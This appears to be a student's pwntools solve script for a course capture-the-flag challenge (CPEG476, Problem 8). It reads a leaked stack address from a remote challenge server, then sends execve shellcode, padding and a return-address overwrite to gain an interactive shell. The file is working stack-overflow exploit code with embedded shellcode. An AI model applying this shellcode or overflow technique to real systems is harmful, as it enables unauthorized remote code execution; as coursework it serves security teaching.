'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Pacecar Problem 8
File Description:  Used to print to the nc session

nc 165.22.46.243 7331
'''

'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Pacecar Problem 8
File Description:  Used to print to the nc session

165.22.46.243", 7331

Run in interactive python to key flag
'''

from pwn import *
p=remote("165.22.46.243", 7331)     # Create remote session
resp=p.recvuntil(b"help ")
leak=p.recvuntil(b"\n")
intleak = int(leak,16)  #random address created
leakaddr = p32(intleak)
shell = b"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" #pop a shell, length 44, print(len(asm(shellcraft.sh())))
filler = b'a'*96
print("This isn't vulnerable")
print("This might help: " + str(leakaddr))
p.sendline(shell+filler+leakaddr)#for nice unprintable payloads
p.interactive()
#if you have a shell then you can now type `ls` and `cat flag`